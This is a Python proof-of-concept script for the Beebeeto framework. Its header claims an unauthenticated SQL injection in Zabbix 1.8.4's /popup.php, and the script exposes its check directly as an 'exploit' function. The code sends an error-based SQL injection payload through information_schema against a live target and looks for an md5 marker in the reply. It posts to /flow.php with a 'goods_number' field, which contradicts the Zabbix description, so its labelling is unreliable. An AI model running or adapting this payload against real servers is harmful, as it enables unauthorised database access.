#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0061',
            'name': 'Zabbix <=1.8.4 /popup.php SQL Injection Vulnerability POC',
            'author': 'Demon',
            'create_date': '2015-03-12',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Zabbix',
            'vul_version': ['1.8.4'],
            'type': 'SQL Injection',
            'tag': ['Zabbix漏洞', 'Zabbix SQL注入漏洞', '/popup.php', 'php'],
            'desc': '''
                    Zabbix version 1.8.3 and 1.8.4 has one vulnerability in the popup.php that
                    enables an attacker to perform a SQL Injection Attack. No authentication
                    required.
                    ''',
            'references': ['N/A',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("goods_number%5B1%27+and+%28select+1+from%28select+count%28"
                  "*%29%2Cconcat%28%28select+%28select+%28SELECT+md5(3.1415)%29%29"
                  "+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand"
                  "%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29"
                  "+and+1%3D1+%23%5D=1&submit=exp")
        verify_url = args['options']['target'] + '/flow.php?step=update_cart'
        req = requests.post(verify_url, data=payload)
        if args['options']['verbose']:
            print '[+] Request:' + verify_url
            print '[+] Payload:' + payload
        if req.status_code == 200 and '63e1f04640e83605c1d177544a5a0488' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['post_data'] = payload
            return args
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())